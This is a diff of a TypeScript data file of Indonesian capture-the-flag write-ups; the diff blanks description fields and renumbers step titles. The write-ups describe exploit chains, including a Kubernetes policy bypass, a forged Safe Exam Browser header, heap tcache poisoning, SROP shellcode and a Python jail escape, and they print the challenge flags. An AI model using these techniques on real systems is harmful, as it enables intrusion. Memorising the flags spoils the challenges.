     "tools": [
       "Python 3",
@@ -734,7 +734,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Devops",
       "NNS CTF"
     ],
-    "description": "Target ini bukan ELF. Service remote adalah frontend Go yang mem-proxy API Kubernetes, operator Go yang merender site menjadi Deployment nginx, dan registry internal untuk konfigurasi origin.\n\nRantai exploit:\n\n1. Bypass policy Kyverno dengan perbedaan parser YAML.\n2. Dapatkan token `tri-edge` dengan audience API Kubernetes.\n3. Gunakan hak `tri-edge` untuk membuat Secret token `tri-registry-sync`.\n4. Gunakan token tersebut untuk membuat Domain dengan perbedaan kapitalisasi host.\n5. Arahkan nginx ke Secret origin dan baca `FLAG`.\n\nFlag diperoleh langsung dari preview service:\n\n```text\nNNS{M1NN_B3st3_venN,_I_7H1nk_th4t_I_M1gH7_h4ve_4_kyv3RN0_4Dd1ct10n_BU7_5om3how_7Here_i5_no_w4Y_70_escap3_tHe_yaM1_FuCk3rY}\n```",
+    "description": "",
     "problemDescription": "Target ini bukan ELF. Service remote adalah frontend Go yang mem-proxy API Kubernetes, operator Go yang merender site menjadi Deployment nginx, dan registry internal untuk konfigurasi origin.\n\nRantai exploit:\n\n1. Bypass policy Kyverno dengan perbedaan parser YAML.\n2. Dapatkan token `tri-edge` dengan audience API Kubernetes.\n3. Gunakan hak `tri-edge` untuk membuat Secret token `tri-registry-sync`.\n4. Gunakan token tersebut untuk membuat Domain dengan perbedaan kapitalisasi host.\n5. Arahkan nginx ke Secret origin dan baca `FLAG`.\n\nFlag diperoleh langsung dari preview service:\n\n```text\nNNS{M1NN_B3st3_venN,_I_7H1nk_th4t_I_M1gH7_h4ve_4_kyv3RN0_4Dd1ct10n_BU7_5om3how_7Here_i5_no_w4Y_70_escap3_tHe_yaM1_FuCk3rY}\n```",
     "tools": [
       "Python 3",
@@ -859,35 +859,35 @@ export const nnsCtfWriteups: WriteUp[] = [
     "analysis": "# Cheese — Writeup\n\n**Category:** Misc\n**Challenge:** Cheese",
     "solution": [
       {
-        "title": "1. Initial reconnaissance",
+        "title": "Initial reconnaissance",
         "content": "Landing page:\n\n```bash\ncurl https://cheese-033cc1c0e999.chall.nnsc.tf\n```\n\nMemberikan:\n\n```html\n<p>This exam runs in Safe Exam Browser only.</p>\n<p><a href=\"sebs://cheese-033cc1c0e999.chall.nnsc.tf/exam.seb\">Launch exam</a></p>\n<p>Configuration password: <code>q-JpVORvQSUQ</code></p>\n```\n\nClue penting:\n\n```text\nIt is not recommended to open the \"exam link\" directly on your machine.\n```\n\nJadi jangan menjalankan `sebs://` atau membuka exam secara langsung. Kita analisis file konfigurasi `.seb`.\n\n---"
       },
       {
-        "title": "2. Download `exam.seb`",
+        "title": "Download `exam.seb`",
         "content": "```bash\ncurl -sk -D- 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam.seb' -o exam.seb\n```\n\nResponse:\n\n```text\nHTTP/2 200\ncontent-type: application/seb\ncontent-length: 4509\n```\n\nCek file:\n\n```bash\nfile exam.seb\n```\n\nOutput:\n\n```text\nexam.seb: gzip compressed data\n```\n\n---"
       },
       {
-        "title": "3. Decompress `.seb`",
+        "title": "Decompress `.seb`",
         "content": "```bash\ngzip -dc exam.seb > exam.raw\n```\n\nHeader file:\n\n```bash\nxxd -l 32 exam.raw\n```\n\ndimulai dengan:\n\n```text\n7073 7764 0201 ...\n```\n\nASCII:\n\n```text\npswd\n```\n\nIni menunjukkan konfigurasi SEB tersebut menggunakan password-protected format.\n\nPassword sudah diberikan oleh halaman:\n\n```text\nq-JpVORvQSUQ\n```\n\n---"
       },
       {
-        "title": "4. Decrypt konfigurasi",
+        "title": "Decrypt konfigurasi",
         "content": "Payload SEB kemudian didecrypt menggunakan password konfigurasi.\n\nHasil decryption berupa gzip:\n\n```bash\ngzip -dc exam.xml.gz > exam.xml\n```\n\nSetelah dibuka, isinya adalah Apple plist XML.\n\nKita cari setting URL:\n\n```bash\ngrep -nE '<key>(startURL|browserExamKey|hashedAdminPassword|quitURL|URLFilterRules|originatorVersion)</key>' exam.xml\n```\n\nDitemukan:\n\n```text\n5228:   <key>startURL</key>\n```\n\nParse plist:\n\n```python\nimport plistlib\n\nd = plistlib.loads(open(\"exam.xml\",\"rb\").read())\n\nfor k,v in d.items():\n    if any(x in k.lower() for x in [\"url\",\"key\",\"password\",\"exam\",\"resource\",\"server\"]):\n        print(f\"{k}: {v!r}\")\n```\n\nHasil penting:\n\n```text\nsendBrowserExamKey: True\nstartURL: 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'\n```\n\nJadi endpoint sebenarnya adalah:\n\n```text\nhttps://cheese-033cc1c0e999.chall.nnsc.tf/exam\n```\n\n---"
       },
       {
-        "title": "5. Endpoint menolak browser biasa",
+        "title": "Endpoint menolak browser biasa",
         "content": "Coba:\n\n```bash\ncurl -sk -i 'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'\n```\n\nResponse:\n\n```text\nHTTP/2 403\n{\"detail\":\"Safe Exam Browser required\"}\n```\n\nMengganti User-Agent juga tidak cukup:\n\n```bash\ncurl -sk -i \\\n  -A 'Mozilla/5.0' \\\n  'https://cheese-033cc1c0e999.chall.nnsc.tf/exam'\n```\n\nTetap:\n\n```text\n403 Safe Exam Browser required\n```\n\nKarena konfigurasi memiliki:\n\n```text\nsendBrowserExamKey = True\n```\n\nserver kemungkinan memvalidasi header SEB.\n\n---"
       },
       {
-        "title": "6. Hitung SEB Config Key",
+        "title": "Hitung SEB Config Key",
         "content": "Dari konfigurasi yang sudah didecrypt, kita hitung Config Key sesuai mekanisme SEB.\n\nHasil:\n\n```text\nCONFIG_KEY =\n59139a49c187bdcca140b7e34207b17de056b2424ceedc8c67bf8c7ed682f577\n```\n\nKemudian request hash:\n\n```text\nREQUEST_HASH =\ne632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61\n```\n\nHeader yang dibutuhkan:\n\n```text\nX-SafeExamBrowser-ConfigKeyHash: e632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61\n```\n\n---"
       },
       {
-        "title": "7. Bypass SEB check",
+        "title": "Bypass SEB check",
         "content": "Request dikirim menggunakan header SEB:\n\n```python\nreq = urllib.request.Request(\n    \"https://cheese-033cc1c0e999.chall.nnsc.tf/exam\",\n    headers={\n        \"X-SafeExamBrowser-ConfigKeyHash\":\n        \"e632a7b1173ed113cb023a6d4fabd021e55e1ac45dad5aea6f9aba1d08fdfd61\"\n    }\n)\n```\n\nDan hasilnya:\n\n```text\nSTATUS = 200\n```\n\nServer memberikan halaman exam.\n\n---"
       },
       {
-        "title": "8. Source halaman langsung membocorkan flag",
+        "title": "Source halaman langsung membocorkan flag",
         "content": "Response halaman:\n\n```html\n<h1>Question 1</h1>\n<p>What's the flag?</p>\n\n<input id=\"answer\" autocomplete=\"off\" autofocus />\n\n<button id=\"check\">Check</button>\n\n<script>\n  const flag = \"NNS{5aY_Ch3353_anD_5M1l3_f0R_7He_10cKd0wN_bRoWs3r_4ND_h0pe_7h47_yoU_63t_th3_C0Rr3C7_ansW3R_soM3how}\";\n</script>\n```\n\nJadi tidak perlu benar-benar menjalankan Safe Exam Browser atau menjawab melalui UI.\n\nFlag berada langsung di JavaScript source.\n\n# Flag\n\n```text\nNNS{5aY_Ch3353_anD_5M1l3_f0R_7He_10cKd0wN_bRoWs3r_4ND_h0pe_7h47_yoU_63t_th3_C0Rr3C7_ansW3R_soM3how}\n```"
       },
       {
@@ -928,27 +928,27 @@ export const nnsCtfWriteups: WriteUp[] = [
         "content": "Panjang side-chain:\n\n```\n1 - 8\n```\n\ndisimpan sebagai:\n\n```\nlength - 1\n```\n\nsehingga:\n\n| Panjang | Nilai |\n|-|-|\n| 1 | 000 |\n| 2 | 001 |\n| 3 | 010 |\n| 4 | 011 |\n| 5 | 100 |\n| 6 | 101 |\n| 7 | 110 |\n| 8 | 111 |\n\n---\n\n# 6. Contoh Dekode\n\nMisalnya dua carbon pertama:\n\nCenter pertama:\n\n```\nR\nlength = 5\n```\n\nMaka:\n\n```\nR = 0\n\nlength-1 = 4\n```\n\nNibble:\n\n```\n0100\n```\n\natau:\n\n```\n0x4\n```\n\n---\n\nCenter kedua:\n\n```\nS\nlength = 7\n```\n\nMaka:\n\n```\nS = 1\n\nlength-1 = 6\n```\n\nNibble:\n\n```\n1110\n```\n\natau:\n\n```\n0xe\n```\n\n---\n\nGabungan:\n\n```\n0x4e\n```\n\nASCII:\n\n```\nN\n```\n\n---\n\n# 7. Algoritma Ekstraksi\n\nLangkah lengkap:"
       },
       {
-        "title": "1. Load Molecule",
+        "title": "Load Molecule",
         "content": "Menggunakan:\n\n```\nRDKit\n```\n\nuntuk membaca:\n\n```\nchiral.mol\n```\n\n---"
       },
       {
-        "title": "2. Cari Atom Terminal",
+        "title": "Cari Atom Terminal",
         "content": "Cari:\n\n```\nFluorine (F)\n```\n\ndan:\n\n```\nBromine (Br)\n```\n\n---"
       },
       {
-        "title": "3. Cari Backbone",
+        "title": "Cari Backbone",
         "content": "Ambil shortest path:\n\n```\nF -> Br\n```\n\n---"
       },
       {
-        "title": "4. Proses Carbon Tengah",
+        "title": "Proses Carbon Tengah",
         "content": "Untuk setiap carbon:\n\nAmbil:\n\n- descriptor chirality;\n- jumlah side-chain yang keluar dari backbone.\n\n---"
       },
       {
-        "title": "5. Bentuk Nibble",
+        "title": "Bentuk Nibble",
         "content": "Formula:\n\n\\[\nnibble =\n(chirality\\_bit << 3)\n|\n(length-1)\n\\]\n\n---"
       },
       {
-        "title": "6. Gabungkan Nibble",
+        "title": "Gabungkan Nibble",
         "content": "Setiap dua nibble:\n\n```\nhigh nibble\n+\nlow nibble\n```\n\nmenjadi:\n\n```\nbyte ASCII\n```\n\n---\n\n# 8. Solve Script\n\nFile:\n\n```\nsolve.py\n```\n\nmelakukan seluruh proses:\n\n```python\n1. Read MOL file\n\n2. Build molecular graph\n\n3. Find F-Br backbone\n\n4. Extract chiral centers\n\n5. Convert R/S + side-chain\n\n6. Combine nibbles\n\n7. Decode ASCII flag\n```\n\n---\n\n# 9. Validasi\n\nSolver melakukan pengecekan:\n\n- backbone harus berakhir pada Br;\n- jumlah carbon sesuai;\n- hasil decode harus berupa printable ASCII.\n\nHal ini mencegah decode salah jika struktur molekul berubah.\n\n---\n\n# 10. Cara Menjalankan\n\nInstall dependency:\n\n```bash\npip install rdkit\n```\n\nJalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\n<FLAG>NNS{ch1r4l1ty_fl1ps_th3_b1ts}</FLAG>\n```\n\n---\n\n# 11. Kesimpulan\n\nChallenge ini menggunakan struktur kimia sebagai media penyimpanan data.\n\nFlag tidak disimpan sebagai:\n\n- string;\n- angka;\n- ciphertext.\n\nMelainkan melalui:\n\n```\nStereochemistry\n        |\n        v\nChiral Center\n        |\n        v\nNibble Encoding\n        |\n        v\nASCII Flag\n```\n\nInformasi yang digunakan:\n\n```\nR/S configuration\n```\n\ndan:\n\n```\nside-chain length\n```\n\nberhasil direkonstruksi menjadi:\n\n```\nNNS{ch1r4l1ty_fl1ps_th3_b1ts}\n```\n\n---\n\n# Flag\n\n```\nNNS{ch1r4l1ty_fl1ps_th3_b1ts}\n```"
       },
       {
@@ -1116,7 +1116,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Misc",
       "NNS CTF"
     ],
-    "description": "File challenge berisi capture bus USB keyboard dari logic analyzer. Karena formatnya `.logicdata`, datanya bukan pcap siap baca Wireshark, tapi stream transisi sinyal yang perlu diparse manual.\n\nAlurnya:\n\n1. Ekstrak transisi dua channel dari `keyboard.logicdata`.\n2. Gabungkan transisi D+/D- menjadi edge differential USB low-speed.\n3. Decode packet USB, ambil transfer `IN` ke device address `6`, endpoint `1`.\n4. Ambil packet `DATA0/DATA1` setelah token itu sebagai HID keyboard report.\n5. Replay report dengan layout keyboard Norway dan dukungan tombol edit.\n6. Ambil flag dari teks hasil replay.",
+    "description": "",
     "problemDescription": "File challenge berisi capture bus USB keyboard dari logic analyzer. Karena formatnya `.logicdata`, datanya bukan pcap siap baca Wireshark, tapi stream transisi sinyal yang perlu diparse manual.\n\nAlurnya:\n\n1. Ekstrak transisi dua channel dari `keyboard.logicdata`.\n2. Gabungkan transisi D+/D- menjadi edge differential USB low-speed.\n3. Decode packet USB, ambil transfer `IN` ke device address `6`, endpoint `1`.\n4. Ambil packet `DATA0/DATA1` setelah token itu sebagai HID keyboard report.\n5. Replay report dengan layout keyboard Norway dan dukungan tombol edit.\n6. Ambil flag dari teks hasil replay.",
     "tools": [
       "Python 3",
@@ -1199,23 +1199,23 @@ export const nnsCtfWriteups: WriteUp[] = [
         "content": "```\nB9\n```\n\n---\n\n# 9. Verifikasi Flash\n\nResponse JEDEC:\n\n```\nc2 28 17\n```\n\ncocok dengan:\n\n```\nMX25R64\n```\n\nyang terdapat pada:\n\n```\nnrf5340dk_nrf5340_spi.overlay\n```\n\n---\n\n# 10. Ekstraksi Data Flash\n\nSPI transaction penting:\n\nContoh:\n\n```\n03 00 10 40\n```\n\nresponse:\n\n```\ndata LittleFS\n```\n\n---\n\nContoh lain:\n\n```\n03 00 b0 00\n```\n\nresponse:\n\n```\nNNS{...}\n```\n\n---\n\nSemua response command:\n\n```\nREAD (0x03)\n```\n\ndigabungkan menjadi:\n\n```\nflash image\n```\n\n---\n\n# 11. Rekonstruksi Flash Image\n\nSolver membuat buffer:\n\n```\n0x10000 byte\n```\n\nKemudian setiap hasil:\n\n```\nREAD address + data\n```\n\nditempatkan sesuai offset flash.\n\n---\n\nHasil pada offset:\n\n```\n0xb000\n```\n\nberisi:\n\n```\nNNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}\n```\n\n---\n\n# 12. Algoritma Solver\n\nFile:\n\n```\nsolve.py\n```\n\nmelakukan:"
       },
       {
-        "title": "1. Parse Capture",
+        "title": "Parse Capture",
         "content": "Membaca:\n\n```\nlittlefs.logicdata\n```\n\n---"
       },
       {
-        "title": "2. Build Waveform",
+        "title": "Build Waveform",
         "content": "Mengubah:\n\n```\ndelta stream\n```\n\nmenjadi:\n\n```\ndigital signal\n```\n\n---"
       },
       {
-        "title": "3. Decode SPI",
+        "title": "Decode SPI",
         "content": "Mencari:\n\n```\nCS LOW\n\n+\n\nclock transition\n\n+\n\nMOSI/MISO bits\n```\n\n---"
       },
       {
-        "title": "4. Rekonstruksi Flash",
+        "title": "Rekonstruksi Flash",
         "content": "Untuk setiap:\n\n```\nREAD command\n```\n\nsimpan:\n\n```\naddress -> response data\n```\n\n---"
       },
       {
-        "title": "5. Search Flag",
+        "title": "Search Flag",
         "content": "Mencari pola:\n\n```\nNNS{\n```\n\npada hasil image.\n\n---\n\n# 13. Struktur Solver\n\nPseudocode:\n\n```python\ncapture = read_logicdata(\n    \"littlefs.logicdata\"\n)\n\n\nwaveform = build_waveform(\n    capture\n)\n\n\ntransactions = decode_spi(\n    waveform,\n    mode=0\n)\n\n\nflash = {}\n\n\nfor tx in transactions:\n\n    if tx.command == 0x03:\n\n        addr = tx.address\n\n        flash[addr] = tx.data\n\n\nimage = rebuild_flash(\n    flash\n)\n\n\nflag = find(\n    image,\n    b\"NNS{\"\n)\n\n\nprint(flag)\n```\n\n---\n\n# 14. Cara Menjalankan\n\nJalankan:\n\n```bash\npython3 solve.py\n```\n\nOutput:\n\n```text\ndecoded SPI bursts: 67\n\nreconstructed READ ranges: 30\n\n<FLAG>\nNNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}\n</FLAG>\n```\n\n---\n\n# 15. Kesimpulan\n\nChallenge ini memanfaatkan fakta bahwa:\n\n```\nFilesystem tidak terenkripsi\n```\n\ndan:\n\n```\nSPI flash communication dapat diamati\n```\n\nWalaupun log firmware tidak tersedia, seluruh operasi membaca file meninggalkan jejak pada komunikasi SPI.\n\nAlur penyelesaian:\n\n```\nLogic Analyzer Capture\n\n        |\n\n        v\n\nDecode SPI NOR\n\n        |\n\n        v\n\nRecover Flash Contents\n\n        |\n\n        v\n\nExtract LittleFS File\n\n        |\n\n        v\n\nRecover Flag\n```\n\nFlag berhasil diperoleh:\n\n```\nNNS{l0g1c_an4ly53rs_c4n_pr0vid3_ins1ght_int0_th3_w0rk1ng5_0f_4n_3mb3dded_sy5t3m}\n```"
       },
       {
@@ -1274,7 +1274,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Misc",
       "NNS CTF"
     ],
-    "description": "Challenge ini menjalankan `eval` dengan `__builtins__` kosong. Input harus berupa list, setiap elemen maksimal 13 karakter, dan seluruh karakter elemen harus berasal dari whitelist:\n\n```text\n),dw.r_[silent]g=c:f(\n```\n\nEscape dilakukan dengan walrus assignment, attribute lookup, dan pemanggilan method yang dibangun dari panjang list.",
+    "description": "",
     "problemDescription": "Challenge ini menjalankan `eval` dengan `__builtins__` kosong. Input harus berupa list, setiap elemen maksimal 13 karakter, dan seluruh karakter elemen harus berasal dari whitelist:\n\n```text\n),dw.r_[silent]g=c:f(\n```\n\nEscape dilakukan dengan walrus assignment, attribute lookup, dan pemanggilan method yang dibangun dari panjang list.",
     "tools": [
       "Python 3",
@@ -1362,7 +1362,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Misc",
       "NNS CTF"
     ],
-    "description": "Flag berada di hard drive virtual yang harus di-mount dari TempleOS lewat noVNC. OS tidak perlu di-install.",
+    "description": "",
     "problemDescription": "Flag berada di hard drive virtual yang harus di-mount dari TempleOS lewat noVNC. OS tidak perlu di-install.",
     "tools": [
       "Python 3",
@@ -1449,7 +1449,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Pwn",
       "NNS CTF"
     ],
-    "description": "Challenge ini memberi sebuah binary `coins` yang kelihatannya seperti program pembayaran sederhana.\n\nSaat dijalankan, program menampilkan dua informasi penting:\n\n```text\nstarting balance:       0x...\nflag price:             [your_balance] + 0x...\n```\n\nRemote berjalan lewat TLS, jadi koneksi biasa dengan socket polos akan timeout. Untuk testing manual bisa memakai:\n\n```bash\nncat --ssl coins-83c5dda255ef.chall.nnsc.tf 1337\n```\n\nFlag yang didapat:\n\n```text\nNNS{wh0_co1N3d_7he_73rM_NUm15m471C5?}\n```\n\n---",
+    "description": "",
     "problemDescription": "Challenge ini memberi sebuah binary `coins` yang kelihatannya seperti program pembayaran sederhana.\n\nSaat dijalankan, program menampilkan dua informasi penting:\n\n```text\nstarting balance:       0x...\nflag price:             [your_balance] + 0x...\n```\n\nRemote berjalan lewat TLS, jadi koneksi biasa dengan socket polos akan timeout. Untuk testing manual bisa memakai:\n\n```bash\nncat --ssl coins-83c5dda255ef.chall.nnsc.tf 1337\n```\n\nFlag yang didapat:\n\n```text\nNNS{wh0_co1N3d_7he_73rM_NUm15m471C5?}\n```\n\n---",
     "tools": [
       "Python 3",
@@ -1533,7 +1533,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Pwn",
       "NNS CTF"
     ],
-    "description": "Parser membaca file dengan format:\n\n- `u32 magic`\n- `u32 length`\n- `u64 checksum`\n- `length` byte content\n\nBug utamanya ada di pembacaan content ke buffer stack fixed-size tanpa validasi panjang. `length` diambil langsung dari file dan dipakai sebagai argumen `fread()`, jadi return address bisa ditimpa.\n\nFlag remote yang keluar dari service:\n\n`NNS{d1d_y0u_f1nd_7h3_g4dg375_7948595bd8}`",
+    "description": "",
     "problemDescription": "Parser membaca file dengan format:\n\n- `u32 magic`\n- `u32 length`\n- `u64 checksum`\n- `length` byte content\n\nBug utamanya ada di pembacaan content ke buffer stack fixed-size tanpa validasi panjang. `length` diambil langsung dari file dan dipakai sebagai argumen `fread()`, jadi return address bisa ditimpa.\n\nFlag remote yang keluar dari service:\n\n`NNS{d1d_y0u_f1nd_7h3_g4dg375_7948595bd8}`",
     "tools": [
       "Python 3",
@@ -1595,7 +1595,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Pwn",
       "NNS CTF"
     ],
-    "description": "Challenge ini memberikan binary pwn sederhana dengan pesan awal:\n\n```text\nno win(), so good luck\n>\n```\n\nSesuai namanya, binary tidak menyediakan fungsi `win()`. Artinya, exploit tidak bisa diselesaikan dengan teknik klasik seperti overwrite return address langsung ke `win()`. Solusinya adalah membangun syscall sendiri menggunakan ROP/SROP, lalu membaca file flag secara manual.\n\nEksploitasi dilakukan dengan memanfaatkan buffer overflow untuk mengambil alih RIP, lalu memakai teknik **SROP** atau **Sigreturn-Oriented Programming**. Dengan SROP, register dapat dikontrol penuh untuk memanggil syscall yang dibutuhkan.\n\nStrategi akhir:\n\n1. Trigger buffer overflow.\n2. Gunakan `rt_sigreturn` untuk memanggil `read(0, .bss, size)`.\n3. Kirim stage kedua ke area `.bss`.\n4. Gunakan SROP lagi untuk memanggil `mprotect()` agar `.bss` menjadi executable.\n5. Lompat ke shellcode.\n6. Shellcode melakukan `open(\"/flag.txt\")`, `read()`, dan `write()`.",
+    "description": "",
     "problemDescription": "Challenge ini memberikan binary pwn sederhana dengan pesan awal:\n\n```text\nno win(), so good luck\n>\n```\n\nSesuai namanya, binary tidak menyediakan fungsi `win()`. Artinya, exploit tidak bisa diselesaikan dengan teknik klasik seperti overwrite return address langsung ke `win()`. Solusinya adalah membangun syscall sendiri menggunakan ROP/SROP, lalu membaca file flag secara manual.\n\nEksploitasi dilakukan dengan memanfaatkan buffer overflow untuk mengambil alih RIP, lalu memakai teknik **SROP** atau **Sigreturn-Oriented Programming**. Dengan SROP, register dapat dikontrol penuh untuk memanggil syscall yang dibutuhkan.\n\nStrategi akhir:\n\n1. Trigger buffer overflow.\n2. Gunakan `rt_sigreturn` untuk memanggil `read(0, .bss, size)`.\n3. Kirim stage kedua ke area `.bss`.\n4. Gunakan SROP lagi untuk memanggil `mprotect()` agar `.bss` menjadi executable.\n5. Lompat ke shellcode.\n6. Shellcode melakukan `open(\"/flag.txt\")`, `read()`, dan `write()`.",
     "tools": [
       "Python 3",
@@ -1669,7 +1669,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Pwn",
       "NNS CTF"
     ],
-    "description": "Vulnerability utamanya adalah use-after-free pada array `parcels`. `destroy_parcel()` memanggil `free()` tetapi pointer dan ukuran slot tidak pernah di-reset. Akibatnya chunk yang sudah di-free masih bisa dibaca lewat `inspect_parcel()` dan masih bisa ditulis lewat `update_parcel()`.\n\nPrimitive akhirnya:\n\n- Leak libc dari metadata unsorted bin pada chunk besar yang sudah di-free.\n- Leak heap dari safe-linking value pada chunk tcache kecil yang sudah di-free.\n- Tcache poisoning untuk mengarahkan alokasi ke `.data`.\n- Overwrite `delivery_hook` dengan `system`, lalu trigger lewat menu `Dispatch parcel`.",
+    "description": "",
     "problemDescription": "Vulnerability utamanya adalah use-after-free pada array `parcels`. `destroy_parcel()` memanggil `free()` tetapi pointer dan ukuran slot tidak pernah di-reset. Akibatnya chunk yang sudah di-free masih bisa dibaca lewat `inspect_parcel()` dan masih bisa ditulis lewat `update_parcel()`.\n\nPrimitive akhirnya:\n\n- Leak libc dari metadata unsorted bin pada chunk besar yang sudah di-free.\n- Leak heap dari safe-linking value pada chunk tcache kecil yang sudah di-free.\n- Tcache poisoning untuk mengarahkan alokasi ke `.data`.\n- Overwrite `delivery_hook` dengan `system`, lalu trigger lewat menu `Dispatch parcel`.",
     "tools": [
       "Python 3",
@@ -1682,15 +1682,15 @@ export const nnsCtfWriteups: WriteUp[] = [
         "content": "Output penting:\n\n```text\n$ file ./parcel_delivery\nELF 64-bit LSB executable, x86-64, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, not stripped\n\n$ checksec --file=./parcel_delivery\nArch: amd64-64-little\nRELRO: Partial RELRO\nStack: No canary found\nNX: NX enabled\nPIE: No PIE (0x400000)\nSHSTK: Enabled\nIBT: Enabled\nStripped: No\n```\n\nImplikasinya:\n\n- `No PIE`: alamat simbol binary tetap. `delivery_hook` selalu berada di `0x404068`.\n- `NX enabled`: shellcode di stack/heap bukan jalur termudah.\n- `No canary`: stack overflow tetap mungkin kalau ada bug stack, tapi challenge ini lebih mudah lewat heap.\n- `Partial RELRO`: GOT masih writable, tapi tidak dibutuhkan karena ada function pointer global.\n- `SHSTK` dan `IBT`: ret2libc biasa jadi kurang menarik. Mengganti function pointer ke fungsi libc yang punya `endbr64` jauh lebih bersih."
       },
       {
-        "title": "1. Leak libc",
+        "title": "Leak libc",
         "content": "Register slot besar `0x500`, lalu buat guard chunk kecil setelahnya supaya chunk besar tidak terkonsolidasi ke top chunk saat di-free.\n\nSetelah `free(slot0)`, `inspect(slot0)` mengeluarkan metadata unsorted bin:\n\n```text\nfirst16 203be04f3c780000203be04f3c780000\nu64fd 0x783c4fe03b20\nu64bk 0x783c4fe03b20\n```\n\nPada glibc Ubuntu 24.04 lokal, `&main_arena = 0x203ac0`. Pointer unsorted yang keluar adalah `main_arena + 0x60`, jadi:\n\n```text\nlibc_base = fd - 0x60 - 0x203ac0\n```"
       },
       {
-        "title": "2. Leak heap",
+        "title": "Leak heap",
         "content": "Alokasikan dua chunk kecil dengan request `0x18`, lalu free berurutan.\n\nLeak dari chunk pertama:\n\n```text\nslot0 leak first8 = 0x0000000000033ba8\n```\n\nItu adalah `chunk_A >> 12` karena `next = NULL`.\n\nLeak dari chunk kedua:\n\n```text\nslot1 leak first8 = 0x0000000033b9b968\n```\n\nNilai ini adalah safe-linked pointer `chunk_A ^ (chunk_B >> 12)`.\n\nDengan stride chunk kecil `0x30`, alamat chunk valid yang memenuhi persamaan adalah:\n\n```text\nchunk_A = 0x...2c0\nchunk_B = chunk_A + 0x30\n```"
       },
       {
-        "title": "3. Arbitrary write via tcache poisoning",
+        "title": "Arbitrary write via tcache poisoning",
         "content": "Overwrite `fd` milik chunk `B` yang sudah di-free lewat `update_parcel(3, ...)`.\n\nTarget langsung `0x404068` gagal karena tidak 16-byte aligned sebagai pointer hasil `malloc()`. Target yang dipakai adalah `0x404060`, lalu `system` ditulis pada offset `+8`, tepat mengenai `delivery_hook`.\n\nEncoding safe-linking:\n\n```text\npoisoned_fd = 0x404060 ^ (chunk_B >> 12)\n```\n\nSetelah itu:\n\n1. `malloc(0x18)` pertama mengambil chunk `B`.\n2. `malloc(0x18)` kedua mengembalikan pointer palsu `0x404060`.\n3. Data `b\"PADDING!\" + p64(system) + ...` menimpa `delivery_hook`."
       },
       {
@@ -1844,7 +1844,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Reverse",
       "NNS CTF"
     ],
-    "description": "Binary meminta sebuah license file sebelum melanjutkan eksekusi, tetapi nama dan path file tidak muncul langsung di `strings`.\n\nPetunjuk challenge mengarah ke system call tracer. Karena program melakukan syscall langsung ke kernel, `ltrace` tidak akan menangkap operasi `open`.\n\nDengan menganalisis disassembly, terlihat bahwa program:\n\n1. membangun path license di memory;\n2. memanggil syscall `openat`;\n3. hanya melanjutkan jika file berhasil dibuka;\n4. kemudian mencetak flag.\n\nPath license yang ditemukan adalah:\n\n```text\n$HOME/.config/nns/key\n```\n\nMembuat file tersebut sudah cukup untuk membuat program melanjutkan dan mencetak flag.",
+    "description": "",
     "problemDescription": "Binary meminta sebuah license file sebelum melanjutkan eksekusi, tetapi nama dan path file tidak muncul langsung di `strings`.\n\nPetunjuk challenge mengarah ke system call tracer. Karena program melakukan syscall langsung ke kernel, `ltrace` tidak akan menangkap operasi `open`.\n\nDengan menganalisis disassembly, terlihat bahwa program:\n\n1. membangun path license di memory;\n2. memanggil syscall `openat`;\n3. hanya melanjutkan jika file berhasil dibuka;\n4. kemudian mencetak flag.\n\nPath license yang ditemukan adalah:\n\n```text\n$HOME/.config/nns/key\n```\n\nMembuat file tersebut sudah cukup untuk membuat program melanjutkan dan mencetak flag.",
     "tools": [
       "Python 3",
@@ -1964,7 +1964,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Reverse",
       "NNS CTF"
     ],
-    "description": "Flag tidak disimpan sebagai plaintext di binary.\n\nProgram menerima input, lalu:\n\n1. melakukan `mmap()` untuk membuat scratch page;\n2. mendecode passphrase ke page tersebut;\n3. membandingkan input dengan isi page menggunakan loop manual;\n4. menghapus isi page dengan zeroing;\n5. memanggil `munmap()`;\n6. baru mencetak `correct` atau `rejected`.\n\nJadi `strings`, `ltrace`, dan `strace` tidak memberikan flag secara langsung.\n\nInti challenge adalah menangkap atau merekonstruksi isi memory scratch page sebelum dihapus.",
+    "description": "",
     "problemDescription": "Flag tidak disimpan sebagai plaintext di binary.\n\nProgram menerima input, lalu:\n\n1. melakukan `mmap()` untuk membuat scratch page;\n2. mendecode passphrase ke page tersebut;\n3. membandingkan input dengan isi page menggunakan loop manual;\n4. menghapus isi page dengan zeroing;\n5. memanggil `munmap()`;\n6. baru mencetak `correct` atau `rejected`.\n\nJadi `strings`, `ltrace`, dan `strace` tidak memberikan flag secara langsung.\n\nInti challenge adalah menangkap atau merekonstruksi isi memory scratch page sebelum dihapus.",
     "tools": [
       "Python 3",
@@ -2063,7 +2063,7 @@ export const nnsCtfWriteups: WriteUp[] = [
       "Reverse",
       "NNS CTF"
     ],
